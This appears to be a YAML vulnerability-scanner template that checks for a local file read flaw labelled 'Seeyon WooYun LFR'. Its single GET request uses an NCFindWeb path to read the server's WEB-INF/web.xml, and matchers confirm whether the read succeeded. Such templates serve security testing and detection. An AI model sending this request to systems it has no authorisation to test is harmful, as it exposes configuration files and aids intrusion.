id: wooyun-2015-148227
info:
  author: princechaddha
  description: A vulnerability in Seeyon WooYun allows remote attackers to include
    the content of locally stored content and disclose it back to the attacker.
  name: Seeyon WooYun LFR
  reference: https://wooyun.x10sec.org/static/bugs/wooyun-2015-0148227.html
  severity: high
  tags: seeyon,wooyun,lfi
requests:
- matchers:
  - status:
    - 200
    type: status
  - part: body
    type: word
    words:
    - <servlet-name>NCInvokerServlet</servlet-name>
  - part: header
    type: word
    words:
    - application/xml
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml'
